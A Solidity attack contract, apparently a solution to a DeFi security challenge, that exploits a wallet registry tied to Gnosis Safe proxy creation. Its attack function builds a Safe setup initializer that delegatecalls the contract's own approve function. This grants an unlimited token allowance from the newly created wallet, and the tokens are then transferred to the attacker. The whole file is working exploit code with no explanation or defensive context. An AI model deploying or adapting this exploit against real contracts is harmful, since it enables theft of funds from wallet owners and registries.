// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "hardhat/console.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract WalletRegistryAttacker is Ownable {
    address private immutable masterCopy;
    IGnosisSafeProxyFactory private immutable walletFactory;
    IProxyCreationCallback private immutable walletRegistry;
    IERC20 private immutable token;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _walletRegistry,
        address _token
    ) {
        masterCopy = _masterCopy;
        walletFactory = IGnosisSafeProxyFactory(_walletFactory);
        walletRegistry = IProxyCreationCallback(_walletRegistry);
        token = IERC20(_token);
    }

    function attack(address[] calldata _owners) external onlyOwner {
        // Use a difference salt for each owner
        uint256 salt = uint256(uint160(_owners[0]));

        // Encode gnosis safe module delegatecall
        bytes memory data = abi.encodeWithSignature(
            "approve(address)",
            address(this)
        );

        // Encode gnosis safe setup init
        bytes memory initializer = abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            _owners,
            uint256(1),
            address(this),
            data,
            address(0),
            address(0),
            uint256(0),
            address(0)
        );

        // Create proxy wallet with factory and use wallet registry callback
        GnosisSafeProxy wallet = walletFactory.createProxyWithCallback(
            masterCopy,
            initializer,
            salt,
            walletRegistry
        );

        // Transfer tokens to attacker
        token.transferFrom(address(wallet), owner(), 10 ether);
    }

    // Gnosis safe module delegatecall function
    function approve(address spender) external {
        // Approve tokens from gnosis safe to attacker contract
        token.approve(spender, type(uint256).max);
    }
}
